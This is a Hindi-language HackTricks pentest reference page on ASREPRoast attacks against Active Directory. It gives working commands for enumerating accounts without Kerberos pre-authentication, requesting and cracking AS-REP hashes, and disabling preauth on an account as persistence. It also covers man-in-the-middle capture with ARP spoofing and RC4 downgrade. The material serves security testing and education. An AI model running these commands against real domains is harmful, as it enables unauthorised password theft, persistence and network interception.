# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast एक security attack है जो उन users का फायदा उठाता है जिनमें **Kerberos pre-authentication required attribute** नहीं होता। मूल रूप से, यह vulnerability attackers को user के password की आवश्यकता के बिना Domain Controller (DC) से किसी user के लिए authentication request करने की अनुमति देती है। इसके बाद DC user के password से प्राप्त key से encrypted message के साथ response करता है, जिसे attackers offline crack करके user का password खोजने का प्रयास कर सकते हैं।

इस attack के लिए मुख्य requirements हैं:

- **Kerberos pre-authentication का अभाव**: Target users में यह security feature enabled नहीं होना चाहिए।
- **Domain Controller (DC) से connection**: Requests भेजने और encrypted messages प्राप्त करने के लिए attackers को DC तक access चाहिए।
- **Optional domain account**: Domain account होने पर attackers LDAP queries के माध्यम से vulnerable users की अधिक efficiently पहचान कर सकते हैं। ऐसे account के बिना attackers को usernames guess करने पड़ते हैं।

#### Vulnerable users की enumeration (domain credentials आवश्यक)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP message का अनुरोध
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus default रूप से **RC4** requests करता है, इसलिए Event ID **4768** में आमतौर पर **preauth type 0** और **ticket encryption type 0x17** दिखाई देता है। यदि आप **`/aes`** जोड़ते हैं (या target के लिए RC4 disabled है), तो इसके बजाय **AES etypes** की अपेक्षा करें।<sup>[[2]](#references)</sup>

#### Quick one-liners (Linux)

- पहले potential targets enumerate करें (जैसे leaked build paths से) और Kerberos userenum चलाएँ: `kerbrute userenum users.txt -d domain --dc dc.domain`
- NetExec का उपयोग करके valid creds के बिना पूरी username list को Roast करें: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- यदि आपके पास creds हैं, तो NetExec को LDAP query करने दें और आपके लिए हर roastable account request करने दें: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- यदि output **`$krb5asrep$23$`** से शुरू होता है, तो इसे Hashcat **`-m 18200`** से crack करें। यदि यह **`$krb5asrep$17$`** या **`$krb5asrep$18$`** से शुरू होता है, तो John **`--format=krb5asrep`** को प्राथमिकता दें।<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

यह न मानें कि हर AS-REP roast RC4 है। Modern tooling requested/negotiated enctype के आधार पर **RC4** (`$krb5asrep$23$`) या **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) return कर सकती है। **`hashcat -m 18200`** केवल **etype 23** के लिए है, जबकि **John** `krb5asrep` को **17/18/23** के लिए सीधे handle करता है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

उस user के लिए **preauth** को आवश्यक न रहने दें, जिस पर आपके पास **GenericAll** permissions (या properties लिखने की permissions) हों:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
## credentials के बिना ASREProast

एक attacker Kerberos pre-authentication के disabled होने पर निर्भर हुए बिना, network में man-in-the-middle position का उपयोग करके network पर transit करते समय AS-REP packets को capture कर सकता है। इसलिए यह VLAN पर सभी users के लिए काम करता है।\
यदि आप no-preauth principal से **TGT** के बजाय **service ticket** लौटाने वाली संबंधित no-credential trick चाहते हैं, तो [Kerberoast](kerberoast.md) देखें।

[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) हमें ऐसा करने की अनुमति देता है। `relay` mode offensively सबसे interesting है, क्योंकि client द्वारा अभी भी **etype 23** advertise किए जाने पर यह **RC4** force कर सकता है; `listen` passive रहता है और केवल वही capture करता है जिस पर client/DC ने negotiation की हो।
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## संदर्भ

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
